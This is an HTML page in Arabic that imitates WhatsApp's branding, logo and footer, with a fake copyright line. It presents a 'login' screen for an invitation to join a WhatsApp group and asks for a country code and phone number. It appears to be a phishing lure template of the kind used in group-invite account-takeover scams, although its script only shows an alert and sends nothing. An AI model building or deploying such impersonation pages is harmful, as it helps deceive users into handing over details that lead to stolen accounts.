<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link rel="icon" href="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg">
    <title>WhatsApp Registration</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #FAF3E7;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        /* شريط التنقل */
        .navbar {
            display: flex;
            justify-content: space-between;
            align-items: center;
            background-color: #25D366;
            padding: 10px 20px;
            color: white;
            font-size: 18px;
        }

        .navbar .logo {
            display: flex;
            align-items: center;
        }

        .navbar .logo img {
            height: 30px;
            margin-right: 10px;
        }

        .navbar .menu {
            cursor: pointer;
            font-size: 22px;
        }

        /* الحاوية الرئيسية */
        .container {
            flex: 1;
            text-align: center;
            background-color: white;
            border-radius: 10px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            max-width: 400px;
            margin: 20px auto;
        }

        .container .design img {
            width: 150px;
            margin-bottom: 20px;
        }

        .container .title {
            font-size: 22px;
            font-weight: bold;
            color: #333;
            margin-bottom: 15px;
        }

        .container .description {
            font-size: 14px;
            color: #555;
            text-align: center;
            margin-bottom: 20px;
        }

        .container .form-group {
            display: flex;
            flex-direction: column;
            gap: 10px;
            align-items: center;
            margin-bottom: 20px;
        }

        .container select,
        .container input {
            border: 1px solid #ddd;
            border-radius: 6px;
            padding: 10px;
            font-size: 14px;
            width: 100%;
            max-width: 300px;
            box-sizing: border-box;
        }

        .container button {
            padding: 12px 20px;
            background-color: #25D366;
            color: white;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            width: 100%;
            max-width: 300px;
        }

        .container button:hover {
            background-color: #1DA955;
        }

        /* الشريط السفلي */
        footer {
            background-color: #f1f1f1;
            color: #888;
            text-align: center;
            padding: 10px;
            font-size: 12px;
            margin-top: auto;
        }

        footer a {
            color: #25D366;
            text-decoration: none;
        }
    </style>
</head>

<body>
    <!-- شريط التنقل -->
    <div class="navbar">
        <div class="logo">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp">
            واتساب
        </div>
        <div class="menu">☰</div>
    </div>

    <!-- الحاوية الرئيسية -->
    <div class="container">
        <!-- الشعار -->
        <div class="design">
            <img src="https://upload.wikimedia.org/wikipedia/commons/6/6b/WhatsApp.svg" alt="WhatsApp Logo">
        </div>

        <!-- العنوان -->
        <div class="title">تسجيل الدخول</div>

        <!-- الوصف -->
        <div class="description">الدعوة للانضمام إلى مجموعة واتساب</div>

        <!-- النموذج -->
        <div class="form-group">
            <select id="countryCode">
                <option value="966">🇸🇦 السعودية +966</option>
                <option value="971">🇦🇪 الإمارات +971</option>
                <option value="965">🇰🇼 الكويت +965</option>
                <option value="974">🇶🇦 قطر +974</option>
                <option value="973">🇧🇭 البحرين +973</option>
                <option value="968">🇴🇲 عمان +968</option>
                <option value="963">🇸🇾 سوريا +963</option>
                <option value="964">🇮🇶 العراق +964</option>
                <option value="962">🇯🇴 الأردن +962</option>
                <option value="970">🇵🇸 فلسطين +970</option>
                <option value="249">🇸🇩 السودان +249</option>
                <option value="253">🇩🇯 جيبوتي +253</option>
                <option value="252">🇸🇴 الصومال +252</option>
                <option value="222">🇲🇷 موريتانيا +222</option>
                <option value="967">🇾🇪 اليمن +967</option>
                <option value="269">🇰🇲 جزر القمر +269</option>
                <option value="211">🇸🇸 جنوب السودان +211</option>
            </select>
            <input id="phoneNumber" type="text" placeholder="رقم الهاتف">
        </div>
        <button onclick="sendMessage()">متابعة</button>
    </div>

    <!-- الشريط السفلي -->
    <footer>
        © 2024 واتساب. جميع الحقوق محفوظة. <br>
        <a href="https://www.whatsapp.com/legal/">سياسة الخصوصية</a> | <a href="https://www.whatsapp.com/">مركز المساعدة</a>
    </footer>

    <script>
        function sendMessage() {
            const countryCode = document.getElementById('countryCode').value;
            const phoneNumber = document.getElementById('phoneNumber').value.trim();

            if (!countryCode || !phoneNumber) {
                alert('يرجى إدخال رمز الدولة ورقم الهاتف');
                return;
            }

            const fullPhoneNumber = `+${countryCode} ${phoneNumber}`;
            alert(`تم إرسال الرقم: ${fullPhoneNumber}`);
        }
    </script>
</body>
</html>
